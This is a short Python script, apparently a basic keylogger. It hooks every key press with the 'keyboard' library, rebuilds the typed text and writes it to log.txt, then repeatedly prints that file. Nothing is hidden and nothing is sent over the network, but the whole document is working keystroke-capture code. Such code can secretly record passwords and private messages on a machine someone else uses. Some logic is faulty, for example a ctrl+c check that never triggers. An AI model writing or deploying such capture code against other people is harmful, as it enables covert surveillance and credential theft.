import keyboard
import time

pressed_keys = []  # Initialize pressed_keys as an empty list
previous_keys = []

def keyLogger(event):
    global pressed_keys, previous_keys
    if event:
        if event.name == 'space':
            pressed_keys.append(' ')
        elif event.name == 'backspace':
            if pressed_keys:
                pressed_keys.pop()
        elif event.name == 'enter':
            pressed_keys.append('\n')
        elif event.name == 'ctrl+c':
            print("The file was closed")
        else:
            pressed_keys.append(event)  # Append the event itself
        print(pressed_keys)  # Print pressed
        # Print the characters
        with open('log.txt','w') as file:
            for item in pressed_keys:
                if isinstance(item, str):
                        file.write(item)
                else:
                        file.write(item.name)
# Register the key logger
keyboard.on_press(keyLogger)
keyboard.wait('esc')  # Wait for the escape key to exit

while True:
    with open('log.txt', 'r') as file:
        content = file.read()
        print(content, end='', flush=True)
    time.sleep(0.5)  # Adjust the delay (in seconds) as needed